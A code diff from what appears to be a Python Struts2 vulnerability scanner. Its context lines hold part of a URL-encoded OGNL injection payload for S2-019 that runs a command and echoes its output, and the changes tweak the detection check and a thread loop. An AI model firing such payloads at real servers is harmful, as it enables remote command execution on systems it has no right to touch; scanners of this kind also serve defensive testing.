@@ -240,9 +240,8 @@ getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3
 BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.\
 get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.\
 lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A', timeout=int(self.Timeout))
-            if len(resp.headers['Content-Length']) == 50001:
+            if resp.headers.has_key('Content-Length') and len(resp.headers['Content-Length']) < 50000:
                 print '[+] %s is vulnerable to s2-019.' %(Url)
-                print '[+] Response of whoami: %s' %(resp.text)
                 self.VulnerableUrlList['s2019'].append(Url)
                 pass
         except requests.Timeout:
@@ -508,12 +507,11 @@ struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28
 
     def ThreadCounter(self):
         time.sleep(1)
-        while True:
+        while self.Status:
             for item in self.TaskList:
                 if not item.isAlive():
                     self.TaskList.remove(item)
-            if not self.Status:
-                break
+                    del item
         return
 
 
@@ -539,3 +537,4 @@ def test():
     scanner = Scanner()
     scanner.Url = ''
     scanner.Scan()
+
